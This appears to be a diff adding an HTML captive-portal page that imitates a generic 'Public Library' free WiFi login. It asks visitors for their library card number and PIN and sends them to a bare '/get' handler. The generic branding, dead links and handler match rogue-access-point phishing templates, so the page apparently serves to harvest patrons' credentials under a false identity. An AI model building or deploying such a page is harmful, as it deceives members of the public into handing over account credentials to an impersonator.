@@ -1,0 +1,51 @@
+<!DOCTYPE html>
+<html>
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width,initial-scale=1,maximum-scale=1">
+<style>
+*{box-sizing:border-box;margin:0;padding:0}
+body{font-family:-apple-system,BlinkMacSystemFont,"Segoe UI",Roboto,Arial,sans-serif;background:#f5f0e8;min-height:100vh;display:flex;flex-direction:column;align-items:center;justify-content:center;padding:20px}
+.top{width:100%;max-width:420px;background:#3d2b1f;border-radius:14px 14px 0 0;padding:20px 24px;display:flex;align-items:center;gap:14px}
+.icon{width:42px;height:42px;background:rgba(255,255,255,0.1);border-radius:8px;display:flex;align-items:center;justify-content:center;flex-shrink:0}
+.icon svg{width:22px;height:22px;fill:#d4a853}
+.tname{font-size:14px;font-weight:700;color:#fff}.tsub{font-size:11px;color:rgba(255,255,255,0.5);margin-top:2px;text-transform:uppercase;letter-spacing:0.5px}
+.card{background:#fff;width:100%;max-width:420px;border-radius:0 0 14px 14px;box-shadow:0 12px 40px rgba(60,40,20,0.15);overflow:hidden}
+.cb{padding:26px 24px 22px}
+.badge{display:flex;align-items:center;gap:10px;background:#faf7f2;border:1px solid #e8ddc8;border-radius:8px;padding:10px 13px;margin-bottom:22px}
+.dot{width:8px;height:8px;background:#22c55e;border-radius:50%;flex-shrink:0;box-shadow:0 0 0 3px rgba(34,197,94,0.2)}
+.badge span{font-size:12.5px;color:#888}.badge strong{color:#3d2b1f;font-weight:600}
+h2{font-size:18px;font-weight:700;color:#3d2b1f;margin-bottom:4px}
+.subh{font-size:13px;color:#888;margin-bottom:10px}
+.lbl{display:block;font-size:11px;font-weight:700;text-transform:uppercase;letter-spacing:0.8px;color:#888;margin-bottom:6px;margin-top:14px}
+input{width:100%;padding:12px 14px;border:1.5px solid #e0d8cc;border-radius:9px;font-size:15px;background:#faf7f2;color:#1a1a1a}
+input:focus{outline:none;border-color:#3d2b1f;box-shadow:0 0 0 3px rgba(61,43,31,0.1)}
+input::placeholder{color:#c0b8a8}
+.terms{font-size:11.5px;color:#888;line-height:1.5;margin-top:14px;margin-bottom:6px}.terms a{color:#3d2b1f}
+.btn{width:100%;padding:13px;border:none;border-radius:9px;background:#3d2b1f;color:#fff;font-size:14px;font-weight:700;cursor:pointer;margin-top:14px}
+.foot{background:#faf7f2;border-top:1px solid #e8ddc8;padding:12px 24px;display:flex;justify-content:space-between}
+.foot span,.foot a{font-size:11px;color:#aaa}.foot a{color:#3d2b1f;text-decoration:none}
+</style>
+</head>
+<body>
+<div class="top">
+  <div class="icon"><svg viewBox="0 0 24 24"><path d="M18 2H6c-1.1 0-2 .9-2 2v16c0 1.1.9 2 2 2h12c1.1 0 2-.9 2-2V4c0-1.1-.9-2-2-2zm0 18H6V4h2v8l2.5-1.5L13 12V4h5v16z"/></svg></div>
+  <div><div class="tname">Public Library</div><div class="tsub">Free WiFi Access</div></div>
+</div>
+<div class="card">
+  <div class="cb">
+    <div class="badge"><div class="dot"></div><span>Network: <strong>Library-Public</strong></span></div>
+    <h2>Library WiFi Login</h2><p class="subh">Sign in with your library card to access the internet.</p>
+    <form action="/get">
+      <label class="lbl">Library Card Number</label>
+      <input name="cardnumber" type="text" placeholder="14-digit card number" required inputmode="numeric" maxlength="14">
+      <label class="lbl">PIN</label>
+      <input name="pin" type="password" placeholder="4-digit PIN" required inputmode="numeric" maxlength="4">
+      <p class="terms">By connecting you agree to the library's <a href="#">Internet Use Policy</a>. Sessions are limited to 2 hours per day.</p>
+      <button type="submit" class="btn">Sign In &amp; Connect</button>
+    </form>
+  </div>
+  <div class="foot"><span>Public Library System</span><a href="#">Help</a></div>
+</div>
+</body>
+</html>
